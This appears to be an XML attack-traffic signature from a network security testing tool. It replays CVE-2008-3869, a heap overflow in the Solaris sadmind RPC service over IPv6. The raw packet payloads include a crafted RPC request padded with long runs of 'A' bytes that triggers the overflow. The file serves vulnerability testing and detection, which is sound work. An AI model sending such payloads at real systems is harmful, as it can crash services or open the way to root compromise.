@@ -1,0 +1,105 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Sun Solaris sadmind RPC Request Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="A heap-based buffer overflow vulnerability exists in the sadmind service within the Sun Solaris operating system. The vulnerability is due to an input validation error when allocating a heap buffer while parsing specially crafted RPC requests. A remote unauthenticated attacker can leverage this vulnerability by sending a crafted RPC message to the target host, to potentially inject and execute arbitrary code with root level privileges.            In a sophisticated attack case where code injection and execution is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally root.            In case if the code execution is not achieved, the sadmind service will be terminated abnormally. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="SUNRPC/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Sun_Microsystems"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Sun_Microsystems_Sun_Microsystems_Solaris"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20090525-03"/>
+    <CVEID display="true" value="CVE-2008-3869"/>
+    <bugtraqID display="true" value="35083"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="7029795fab141a5944736cffd8681860"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1245253464"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1245253498" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="H"/>
+    <NamedVar name="SUNRPCdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="B"/>
+    <for index="C">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="D"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$SUNRPCdestPort" checksum="7C88" length="0040" Payload="123456780000000000000002000186A0000000020000000300000000000000000000000000000000000187880000000A0000001100000000"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$SUNRPCdestPort" checksum="71DE" length="0568" Payload="123456790000000000000002000187880000000A000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000400000000000000047F000001000187880000000A000000047F000001000187880000000A000000110000001E00000000000000000000000000000000000000096C6F63616C686F73740000000000000673797374656D00000000001041414141414141414141414141414141000003EE0000000E41444D5F46575F56455253494F4E000000000003000000040000000100000000000000000000000841444D5F4C414E470000000900000002000000014300000000000000000000000000000D41444D5F52455155455354494400000000000009000000120000001130303030393A3030303030303030303A3000000000000000000000000000000941444D5F434C41535300000000000009000000070000000673797374656D000000000000000000000000000E41444D5F434C4153535F564552530000000000110000000A0000025841414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414100000000000000000000000A41444D5F4D4554484F4400000000000900000005000000047465737400000000000000000000000841444D5F484F5354000000090000000A000000096C6F63616C686F737400000000000000000000000000000F41444D5F434C49454E545F484F535400000000090000000A000000096C6F63616C686F737400000000000000000000000000001141444D5F434C49454E545F444F4D41494E00000000000009000000010000000000000000000000000000001141444D5F54494D454F55545F5041524D53000000000000090000001C0000001B54544C3D302050544F3D32302050434E543D322050444C593D33300000000000000000000000000941444D5F46454E43450000000000000300000004000000000000000000000000000000015800000000000009000000150000001442424242424242424242424242424242424242420000000000000000000000106E65746D67745F656E646F6661726773"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1,3">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <UDP srcPort="" destPort="" checksum="0A3A" length="0024" Payload="123456780000000100000000000000000000000000000000000080D2"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <UDP srcPort="" destPort="" checksum="0A3A" length="0024" Payload="123456780000000100000000000000000000000000000000000080D2"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
